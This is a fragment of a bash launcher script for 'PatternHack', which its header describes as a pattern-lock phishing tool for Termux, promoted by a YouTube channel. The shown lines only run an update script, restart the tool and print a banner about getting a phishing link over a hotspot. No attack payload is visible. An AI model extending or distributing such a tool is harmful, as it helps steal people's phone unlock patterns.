#!/bin/bash
#PatternHack by @the_tech_analyst
#Subscribe: https://www.youtube.com/channel/UCDgH9dOObJ3ccVgkv92i7nQ
#NOT FOR ILLEGAL USE
#Pattern Phising Tool For Termux
...
echo
cd $HOME/PatternHack/core/update/
bash update.sh
sleep 6
cd $HOME/PatternHack/
bash PatternHack.sh
...
printf "\n"
printf "\n"
printf "                \e[104m\e[1;77m  >>  Script By Tech Analyst << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Tech Analyst \e[100m\e[1;77m << \e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m #>   Note: Turn on mobile hotspot to get the link.....!  <# \e[0m\n"
printf "\n"
}
